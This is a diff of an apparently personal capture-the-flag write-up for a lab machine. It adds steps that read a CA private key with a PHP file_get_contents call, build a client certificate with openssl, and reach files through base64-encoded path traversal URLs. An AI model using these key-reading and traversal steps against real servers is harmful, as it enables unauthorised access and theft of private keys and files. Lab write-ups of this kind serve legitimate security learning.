@@ -2,6 +2,8 @@
 
 10.10.10.131
 
+![logo](./logo.pngs)
+
 # User
 
 After an nmap scan it can be seen that the server is running vsftpd 2.3.4.
@@ -100,5 +102,39 @@ KfL6K9/P96nYpP4beXMkWZDduGO8V4ELSgAKWoGRtOBf7732H1oUvYeJgIbEEXzt
 
 It provides us with a signed certificate!
 
+Running:
+```
+$caKey = file_get_contents('/home/nairobi/ca.key');
+```
+Will give us the ca.key used to signed the certificate. This will let us turn the signed cert into a pk12 file
 
-openssl pkcs12 -export -inkey user.key -in signed.pem -out signed.p12
+
+Chagning into a pk12 file:
+```
+openssl pkcs12 -export -inkey ca.key -in signed.crt -out signed.p12
+```
+
+Using this cert brings us to a ```PRIVATE AREA``` where we can request files with this URL:
+
+```
+https://10.10.10.131/?path=X
+```
+
+From error messages we seem to be in:
+
+```
+/home/berlin/downloads/home/
+```
+
+When downloading files we're directed to a url like so:
+```
+https://10.10.10.131/file/Li4vZG93bmxvYWRzL1NFQVNPTi0yLzAxLmF2aQ==
+```
+
+This is a base64 encoded file path. In theory this should let us encode our own
+
+Below is ```../user.txt``` url:
+
+```
+https://10.10.10.131/file/Li4vdXNlci50eHQK
+```
